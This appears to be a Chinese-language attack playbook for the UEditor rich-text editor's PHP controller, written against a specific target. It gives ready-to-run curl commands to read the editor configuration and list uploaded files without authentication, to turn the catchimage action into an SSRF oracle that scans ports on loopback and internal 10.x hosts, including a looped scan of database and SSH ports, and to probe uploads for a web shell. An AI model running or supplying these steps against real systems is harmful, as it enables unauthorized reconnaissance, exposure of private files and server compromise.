# 0. 定位真实控制器路径（UEditor 部署路径可任意改名，先读配置）
curl -sS "$BASE/static/ueditor/ueditor.config.js" | grep -i serverUrl
# 常见路径：/ueditor/php/controller.php、/static/ueditor/php/controller.php、
#           /yunqikds_static/editor/php/controller.php（本靶标实测路径）

CTRL="$BASE/<ueditor路径>/php/controller.php"

# 1. config 未授权泄露（含 imageMaxSize / catcherLocalDomain / catcherAllowFiles / 路径模板）
curl -sS "$CTRL?action=config" | tee ue_config.json
# 关注：imageMaxSize（若为超大值如 204800000000 = 可传 200GB）、
#       catcherLocalDomain、fileAllowFiles（决定能否传 zip/pdf 等）

# 2. 已上传文件未授权列举（直接读出存量文件路径，可用于找泄漏资料/头像/合同）
curl -sS "$CTRL?action=listimage&start=0&size=50"
# 返回 {"state":"SUCCESS","list":[{"url":"/Uploads/image/20261104/17xxxx.png","mtime":...}],"total":N}

# 3. catchimage SSRF —— 只打回环，用响应文案区分端口状态（端口探测 oracle）
#    开放端口但非图片：
curl -sS -X POST "$CTRL?action=catchimage" --data 'source[]=http://127.0.0.1:80/'
#   → {"state":"SUCCESS","list":[{"state":"链接contentType不正确",...}]}
#    关闭端口：
curl -sS -X POST "$CTRL?action=catchimage" --data 'source[]=http://127.0.0.1:1/'
#   → {"state":"SUCCESS","list":[{"state":"链接不可用",...}]}
#    DNS/路由不可达：{"state":"链接不可用"} 或 "远程连接出错"
#   ⇒ 「链接contentType不正确」= 端口 OPEN 且回了 HTTP 头；「链接不可用」= CLOSED/FILTERED
#   即：一个无回显 SSRF 通过文案差异变成端口状态 oracle（可扫内网 10.x 段的 http 端口）。

# 4. 批量端口探测（慢速、串行、每请求间隔）
for p in 22 80 443 3306 6379 8080 8009 9000 27017; do
  r=$(curl -sS -m 15 -X POST "$CTRL?action=catchimage" --data "source[]=http://127.0.0.1:$p/" | grep -o '链接[^"]*')
  echo "$p -> $r"; sleep 0.5
done

# 5. 其它内网主机同理：source[]=http://10.10.3.115:PORT/
#    注意：catchimage 只接收图片 content-type，无法读取正文/回显数据，
#    因此这是「端口/存活 oracle」而非数据外带通道；要读正文需找 curl/file_get_contents 型参数。

# 6. 顺带测上传面（UEditor 经典 getshell 面，需可控后缀 + 解析目录）：
#    ?action=uploadfile（fileAllowFiles 含 zip/pdf/doc 时）上传后是否落在可执行目录
#    若 Uploads 目录被 nginx 配置为不解析 php（本靶标 /Uploads/ 403），则仅存储型风险

## 判定要点
- `?action=config` 返回 200 + JSON 且不需任何 Cookie ⇒ 控制器无鉴权（Web 目录直连部署的典型漏配）。
- listimage 返回真实文件列表 ⇒ 存量文件未授权读取（隐私/资料泄露）。
- catchimage 两步文案差异是**确定性判据**，不依赖响应时间（避免本机 TUN 抖动干扰）。